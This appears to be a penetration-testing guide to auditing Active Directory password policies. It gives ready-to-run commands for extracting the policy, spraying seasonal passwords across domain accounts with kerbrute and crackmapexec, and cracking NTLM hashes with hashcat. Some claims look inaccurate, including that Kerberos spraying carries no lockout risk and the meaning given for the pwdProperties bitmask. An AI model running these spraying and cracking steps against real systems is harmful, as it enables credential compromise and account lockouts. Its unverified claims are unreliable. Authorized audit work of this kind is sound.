# Password Policy Auditing Methodology Guide

> Systematic approach to auditing password policies in enterprise environments: Active Directory assessment, password spray detection, policy enforcement testing, and reporting. Designed for engagements targeting corporate identity infrastructure.

---

## Introduction

Weak password policies are one of the most common findings in enterprise penetration tests. Organizations often enforce complexity rules that look good on paper but fail in practice — requiring "8 characters with a special character" leads to "Summer2025!" everywhere. This guide covers the full audit lifecycle: extracting the policy, testing its enforcement, spraying common passwords, and delivering actionable findings.

---

## Practical Steps

### 1. Active Directory Password Policy Extraction

Before testing, understand what the policy allows and enforces.

```bash
# Using ldapsearch to extract the domain password policy
ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\jdoe" -w 'Password123!' -b "DC=corp,DC=local" -s sub "(objectClass=domainDNS)" maxPwdAge minPwdAge minPwdLength pwdHistoryLength pwdProperties

# Using PowerView (from a Windows pivot)
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess

# Using crackmapexec
crackmapexec ldap dc01.corp.local -u jdoe -p 'Password123!' --pass-pol

# Using net commands (from a domain-joined host)
net accounts /domain
net accounts /domain /domain:corp.local
```

Key fields to note:
- **minPwdLength**: Minimum password length (anything below 12 is weak)
- **pwdHistoryLength**: Password history (0 means users can reuse the same password immediately)
- **maxPwdAge**: Maximum password age in ticks (convert: `ticks / -864000000000` = days)
- **pwdProperties**: Bitmask — 1 = complex, 2 = no change, 16 = smartcard required

### 2. Fine-Grained Password Policy Discovery

Large domains often override the default policy with Fine-Grained Password Policies (FGPP) applied to specific groups.

```bash
# Enumerate FGPP with ldapsearch
ldapsearch -x -H ldap://dc01.corp.local -D "CORP\\jdoe" -w 'Password123!' -b "DC=corp,DC=local" "(objectClass=msDS-PasswordSettings)" msDS-PasswordSettingsPrecedence msDS-MinimumPasswordLength msDS-PasswordHistoryLength msDS-LockoutThreshold msDS-LockoutDuration

# Using PowerView
Get-DomainFGPP
```

### 3. Password Spray Testing

Test whether common seasonal or organizational passwords work across the domain. This reveals whether the policy actually prevents predictable passwords.

```bash
# Using kerbrute for pre-authentication spraying (no lockout risk)
kerbrute passwordspray -d corp.local --dc dc01.corp.local users.txt 'Summer2025!'

# Using crackmapexec for SMB spraying
crackmapexec smb dc01.corp.local -u users.txt -p 'Company2025!' --no-bruteforce

# Using spray (timed to avoid lockouts)
spray.sh smb dc01.corp.local users.txt passwords.txt 1 30

# Common spray passwords to test
cat > spray_passwords.txt << 'EOF'
Summer2025!
Winter2025!
Company2025!
Welcome1!
Password1!
Changeme1!
EOF
```

Important: Always check the lockout policy (lockoutThreshold and lockoutDuration) before spraying. If lockoutThreshold is 0 (no lockout) or high (>10), spraying is safer. If it is low (3-5), use extreme caution and spray one password per lockout window.

### 4. Policy Enforcement Testing

Verify that the stated policy is actually enforced. Misconfigurations are common.

```bash
# Test if complexity is enforced by trying a weak password
# Using smbpasswd or net command
net password /domain /user:testuser /oldpassword:'OldPass123!' /newpassword:'weak'

# Test minimum length enforcement
# Attempt to set a 4-character password via LDAP
ldapmodify -x -H ldap://dc01.corp.local -D "CORP\\jdoe" -w 'Password123!' << EOF
dn: CN=testuser,OU=Users,DC=corp,DC=local
changetype: modify
replace: unicodePwd
unicodePwd:: IgB3AGUAaQBrACIA
EOF

# Test password history enforcement
# Change password to X, then attempt to change back to X immediately

# Test if users can set their password to their username
# This is a common policy gap
```

### 5. Credential Assessment and Reporting

After testing, analyze the results and deliver findings.

```bash
# Analyze cracked passwords for patterns
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --show | awk -F: '{print $2}' | sort | uniq -c | sort -rn | head -20

# Check for password reuse across accounts
# If multiple accounts share the same NTLM hash, they share the same password
awk -F: '{print $2}' cracked.txt | sort | uniq -c | sort -rn | head -20

# Generate password complexity statistics
python3 -c "
import re
with open('cracked_passwords.txt') as f:
    pwds = [l.strip() for l in f]
short = sum(1 for p in pwds if len(p) < 12)
no_special = sum(1 for p in pwds if not re.search(r'[^a-zA-Z0-9]', p))
seasonal = sum(1 for p in pwds if re.search(r'(?:Spring|Summer|Fall|Winter|January|February|March|April|May|June|July|August|September|October|November|December)', p, re.I))
print(f'Total cracked: {len(pwds)}')
print(f'Under 12 chars: {short} ({short*100//len(pwds)}%)')
print(f'No special char: {no_special} ({no_special*100//len(pwds)}%)')
print(f'Seasonal pattern: {seasonal} ({seasonal*100//len(pwds)}%)')
"
```

---

## References

- MITRE ATT&CK: [T1110.003 - Password Spraying](https://attack.mitre.org/techniques/T1110/003/)
- NIST SP 800-63B: Digital Identity Guidelines — [https://pages.nist.gov/800-63-3/sp800-63b.html](https://pages.nist.gov/800-63-3/sp800-63b.html)
- Microsoft Password Policy Reference: [https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-policy](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/password-policy)
- CrackMapExec: [https://github.com/Porchetta-Industries/CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)
- Kerbrute: [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)
